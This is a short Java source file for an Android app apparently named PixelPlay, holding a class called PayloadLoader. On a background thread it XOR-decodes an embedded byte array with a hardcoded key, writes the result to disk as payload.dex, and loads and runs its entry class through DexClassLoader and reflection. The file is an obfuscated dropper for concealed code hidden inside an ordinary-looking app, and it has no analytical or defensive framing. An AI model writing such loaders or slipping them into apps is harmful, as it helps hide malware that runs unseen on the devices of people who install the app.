package com.pixelplay.app;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class PayloadLoader {
    private static final String TAG = "PixelPlay";
    private static final byte[] XK = {0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, (byte)0x8F};
    private static boolean loaded = false;

    public static void start(Context ctx) {
        if (loaded) return;
        loaded = true;
        new Thread(() -> loadEmbedded(ctx)).start();
    }

    private static void loadEmbedded(Context ctx) {
        try {
            byte[] enc = PayloadData.DATA;
            if (enc.length == 0) {
                Log.d(TAG, "[+] no payload data embedded");
                return;
            }

            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++)
                dec[i] = (byte)(enc[i] ^ XK[i % XK.length]);

            File dexFile = new File(ctx.getFilesDir(), "payload.dex");
            FileOutputStream fos = new FileOutputStream(dexFile);
            fos.write(dec);
            fos.close();

            Log.d(TAG, "[+] payload extracted: " + dexFile.length() + " bytes");

            DexClassLoader cl = new DexClassLoader(
                dexFile.getAbsolutePath(),
                ctx.getCodeCacheDir().getAbsolutePath(),
                null,
                ctx.getClassLoader()
            );

            Class<?> entry = cl.loadClass("com.pixelplay.payload.PayloadEntry");
            Method m = entry.getMethod("start", Context.class);
            m.invoke(null, ctx);

            Log.d(TAG, "[+] payload loaded from embedded resource");
        } catch (Exception e) {
            Log.e(TAG, "[!] payload error: " + e.getMessage());
        }
    }
}
